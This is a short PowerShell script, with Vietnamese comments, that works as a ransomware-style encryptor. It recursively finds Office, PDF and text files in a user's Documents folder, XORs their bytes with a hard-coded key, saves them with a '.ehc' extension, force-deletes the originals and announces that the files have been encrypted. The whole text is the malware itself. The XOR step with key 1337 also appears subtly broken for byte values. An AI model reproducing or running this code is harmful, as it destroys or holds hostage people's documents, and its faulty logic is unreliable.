$targeted_file = @('*.txt', '*.docx', '*.xlsx', '*.pptx', '*.pdf')
$targeted_folder = @('C:\Users\anhbq16\Documents')
$key = 1337

Get-ChildItem -Path $targeted_folder -Recurse -File -Include $targeted_file | ForEach-Object {
    $file_path = $_.FullName
    $bytes = [System.IO.File]::ReadAllBytes($file_path)
    for ($i=0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $key
    }
    $new_file_path = $file_path + ".ehc"
    [System.IO.File]::WriteAllBytes($new_file_path, $bytes)
    Remove-Item -Path $file_path -Force  # Chỉ xóa khi đã tạo file .ehc
    Write-Host "Encrypted: $new_file_path"
}
Write-Host "Files da bi encrypt"
